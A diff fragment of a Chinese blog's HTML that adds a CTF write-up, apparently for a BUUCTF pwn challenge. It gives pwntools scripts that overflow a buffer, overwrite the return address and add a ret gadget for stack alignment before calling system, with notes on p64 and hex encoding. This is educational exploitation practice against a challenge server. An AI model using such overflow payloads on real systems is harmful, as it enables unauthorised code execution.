+<p>百度搜索相关资料，找到解决方法—添加后缀（**.decode(“iso-8859-1”)**）进行转码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p64(<span class="number">1853186401</span>).decode(<span class="string">&quot;iso-8859-1&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401185</span>).decode(<span class="string">&quot;iso-8859-1&quot;</span>) + p64(<span class="number">0x401186</span>).decode(<span class="string">&quot;iso-8859-1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>要使用额外地址的原因是栈地址需要对齐才能执行system。</p>
+<p>（<em>64位<strong>ubuntu18</strong>以上系统调用<strong>system</strong>函数时是需要栈对齐的。再具体一点就是64位下<strong>system</strong>函数有个<strong>movaps</strong>指令，这个指令要求内存地址必须16字节对齐</em>）</p>
+<p>解决方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#加1去跳过一个栈操作指令，使其对齐16字节</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;please input&quot;)#这里用recvuntil会报连接超时，因为nc上去发现服务器那边的程序上没有打印这句话</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401016</span>)+p64(<span class="number">0x401186</span>)+p64(<span class="number">0</span>)<span class="comment">#0x401016是一个ret指令， p64(0)是system函数的返回地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><em><strong>p32、p64所做的是，将一个整形数据进行hex转换后，将这个进行转换成byte型，并进行小段输入。</strong></em></p>
+<p>（<em>Hex</em>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hex就是16进制，本质上是将字节数组转化为16进制，然后用字符串的形式表现出来。</span><br><span class="line"></span><br><span class="line">原理：一个8bit的数据，也就是（xxxx xxxx）,每4个bit可以转化为一个16进制表示，也就是8个bit会转化为（00-ff）之间的16进制数字。</span><br><span class="line"></span><br><span class="line">hex编码 ：指将数据编码16进制字符串；hex解码：指16进制字符串解码为数据。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/14/%E4%BE%8B%E9%A2%98%E5%85%B3%E4%BA%8Egdb%E8%B0%83%E8%AF%95%E7%9A%84%E6%AD%A5%E9%AA%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -713,7 +1016,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
